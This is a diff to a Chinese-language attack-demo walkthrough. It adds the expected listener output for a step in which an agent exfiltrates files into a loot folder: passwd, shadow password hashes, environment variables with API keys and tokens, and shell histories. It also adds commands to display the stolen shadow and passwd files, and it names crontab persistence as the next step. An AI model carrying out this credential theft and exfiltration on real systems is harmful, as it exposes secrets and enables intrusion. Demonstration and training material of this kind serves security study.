@@ -360,7 +360,7 @@ Agent 會自動：
 
 ### T3 — 觀察 Listener 接收
 
-預期輸出：
+預期輸出（會持續刷資料，不用等全部傳完）：
 ```
 [+] START file_id=a1b2 filename=passwd
 [+] Receiving: 0003/0042 (a1b2)
@@ -371,6 +371,30 @@ Agent 會自動：
 [+] START file_id=c3d4 filename=bash_history
 ...
 [+] Saved: ./loot/bash_history
+```
+
+> Listener 有 300 秒 timeout，時間到會自動關閉。不需要等全部傳完，畫面有在刷就能展示效果。
+
+### 確認收到的檔案
+
+```bash
+ls -la loot/
+```
+
+預期收到的關鍵檔案：
+
+| 檔案 | 說明 | 嚴重性 |
+|------|------|--------|
+| `passwd` | 系統帳號清單 | 高 |
+| `shadow` | 密碼 hash | **極高** |
+| `env` | 環境變數（可能含 API key、token） | 高 |
+| `*_.bash_history` | 各使用者的指令歷史 | 中 |
+| `*_.bashrc` | 各使用者的 shell 設定 | 低 |
+
+Demo 時挑幾個展示：
+```bash
+cat loot/passwd | head -5
+cat loot/shadow | head -5
 ```
 
 ### T3 — 植入 Crontab 持久化（為回合 7 埋伏筆）
